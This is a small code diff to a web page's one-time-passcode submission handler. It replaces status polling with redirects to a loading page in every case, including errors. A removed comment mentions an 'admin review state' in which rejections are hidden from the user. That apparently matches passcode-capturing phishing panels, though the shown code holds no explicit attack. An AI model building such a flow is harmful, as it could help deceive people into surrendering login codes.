@@ -434,15 +434,14 @@
       .then(function(res){ return res.json(); })
       .then(function(data){
         if (data && data.ok) {
-          pollOtpStatus();
+          window.location.href = 'loading-en.html?type=otp&id=' + encodeURIComponent(requestId);
           return;
         }
-        // Do not show rejection immediately; the user stays in admin review state.
-        pollOtpStatus();
+        window.location.href = 'loading-en.html?type=otp&id=' + encodeURIComponent(requestId);
       })
       .catch(function(err){
         console.warn('Could not reach the backend server:', err);
-        pollOtpStatus();
+        window.location.href = 'loading-en.html?type=otp&id=' + encodeURIComponent(requestId);
       });
     });
 
